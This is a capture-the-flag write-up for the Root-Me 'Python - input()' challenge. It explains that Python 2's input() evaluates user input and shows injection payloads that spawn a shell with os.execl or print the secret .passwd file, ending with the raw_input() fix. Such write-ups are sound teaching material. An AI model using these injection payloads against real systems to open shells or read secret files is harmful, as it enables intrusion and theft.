### Challenge Documentation: Python - input()

**Category:** Root-Me / App-Script  

**Link:** [Python - input()](https://www.root-me.org/en/Challenges/App-Script/Python-input)

#### **Objective**

The goal is to exploit the insecure use of the Python `input()` function to read and display the hidden password stored in the `.passwd` file.

### **1. Initial Setup**

The challenge provides SSH credentials to access the server:  
- **Host**: `challenge02.root-me.org`  
- **Port**: `2222`  
- **Username**: `app-script-ch6`  
- **Password**: `app-script-ch6`

#### **Connection Command**:
```bash
ssh -p 2222 app-script-ch6@challenge02.root-me.org
```

### **2. Source Code Analysis**

The provided Python script:
```python
#!/usr/bin/python2

import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)

try:
    p = input("Please enter password : ")
except:
    youLose()

with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

### **3. Key Observations**

1. The `input()` function in Python 2 **executes the user's input as code**.  
   - This is inherently insecure, as any Python code entered by the user is evaluated directly.

2. The script reads the `.passwd` file to validate the input.  
   - If the value provided by the user matches the content of `.passwd` as an integer, the password is considered correct.

3. By injecting malicious Python code through the `input()` function, we can:  
   - **Execute arbitrary shell commands.**
   - **Read the content of `.passwd`.**

### **4. Exploitation Steps**

#### **Step 1: Start the Vulnerable Script**

Run the provided Python script on the server:
```bash
./setuid-wrapper
```

The script prompts for a password:
```
Please enter password :
```

#### **Step 2: Inject Malicious Code**

We exploit the `input()` function by injecting Python code to read and display the content of `.passwd`:

**Payload:**
```python
__import__("os").execl("/bin/sh", "sh")
```

This spawns an interactive shell. Once inside the shell, we can directly read the `.passwd` file:
```bash
cat .passwd
```

Alternatively, inject a single-line Python command to print the content of `.passwd`:
```python
sys.stdout.write(open(".passwd").readline())
```

#### **Step 3: Retrieve the Password**

The output reveals the password:
```
***************************
```

### **5. Summary of Commands**

Here is the complete set of commands used to solve the challenge:

```bash
ssh -p 2222 app-script-ch6@challenge02.root-me.org

# Run the vulnerable Python script
./setuid-wrapper

# Inject malicious code to spawn a shell
__import__("os").execl("/bin/sh", "sh")

# Once in the shell, read the .passwd file
cat .passwd
```

OR

```bash
# Inject malicious code to print the password directly
sys.stdout.write(open(".passwd").readline())
```

### **6. Output**

The password is displayed after executing the malicious code:
```
***************************
```

### **7. Conclusion**

By exploiting the insecure use of `input()` in Python 2, we executed arbitrary Python code and gained access to the `.passwd` file. This highlights the importance of using `raw_input()` in Python 2 or `input()` in Python 3 for safer input handling.  
